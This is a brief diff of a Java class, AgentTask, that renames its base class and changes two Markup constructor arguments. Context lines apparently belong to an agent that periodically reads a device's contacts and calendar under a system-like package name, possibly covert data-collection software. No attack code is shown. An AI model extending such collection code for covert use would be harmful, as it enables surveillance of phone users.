@@ -41,7 +41,7 @@ import com.android.service.util.DateTime;
 import com.android.service.util.Utils;
 import com.android.service.util.WChar;
 
-public class AgentTask extends AgentBase {
+public class AgentTask extends BaseAgent {
 	private static final String TAG = "AgentAddressbook"; //$NON-NLS-1$
 	private static final int FLAG_RECUR = 0x00000008;
 	private static final int FLAG_RECUR_NoEndDate = 0x00000010;
@@ -80,8 +80,8 @@ public class AgentTask extends AgentBase {
 		setPeriod(180 * 60 * 1000);
 		setDelay(200);
 
-		markupContacts = new Markup(getType(), 0);
-		markupCalendar = new Markup(getType(), 1);
+		markupContacts = new Markup(this, 0);
+		markupCalendar = new Markup(this, 1);
 
 		// the markup exists, try to read it
 		if (markupContacts.isMarkup()) {
